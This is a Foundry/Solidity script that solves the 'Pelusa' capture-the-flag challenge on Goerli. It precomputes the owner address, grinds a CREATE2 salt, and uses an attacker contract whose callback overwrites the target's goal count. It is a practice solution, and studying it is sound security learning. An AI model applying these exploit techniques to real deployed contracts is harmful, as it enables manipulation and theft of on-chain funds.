// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengePelusa.sol";

contract Hack {
    function deployPlayer(Pelusa pelusa, address owner, bytes32 salt) external {
        new Valdano{salt: salt}(pelusa, owner);
    }
}

contract Valdano is IGame {
    address internal player;
    uint256 public goals;

    constructor(Pelusa pelusa, address _player) {
        player = _player;
        pelusa.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return player;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

// https://goerli.etherscan.io/address/0xdc142f4a7BA5C761EB37aadcEa76D9caD4a2c65c
contract ChallengePelusaScript is Script {
    address constant instance = 0xdc142f4a7BA5C761EB37aadcEa76D9caD4a2c65c;

    function run() public {
        vm.startBroadcast();

        Pelusa pelusa = Pelusa(instance);
        Hack hack = new Hack();

        address createdBy = 0xAA758e00ecA745Cab9232b207874999F55481951;
        bytes32 createdAtBlockHash = bytes32(uint256(0));
        address owner = address(uint160(uint256(keccak256(abi.encodePacked(createdBy, createdAtBlockHash)))));
        bytes32 salt = calculateSalt(address(hack), owner);
        hack.deployPlayer(pelusa, owner, salt);

        console.log("isGoal", pelusa.isGoal());

        pelusa.shoot();

        console.log("goals", pelusa.goals());
    }

    function calculateSalt(address hackAddress, address owner) private returns (bytes32){
        uint256 salt = 0;
        bytes32 initHash = keccak256(
            abi.encodePacked(type(Valdano).creationCode, abi.encode(instance, owner))
        );

        while(true) {
            bytes32 hash = keccak256(
                abi.encodePacked(bytes1(0xff), hackAddress, bytes32(salt), initHash)
            );

            if (uint160(uint256(hash)) % 100 == 10) {
                console.log("Precalculated Address", address(uint160(uint(hash))));
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}
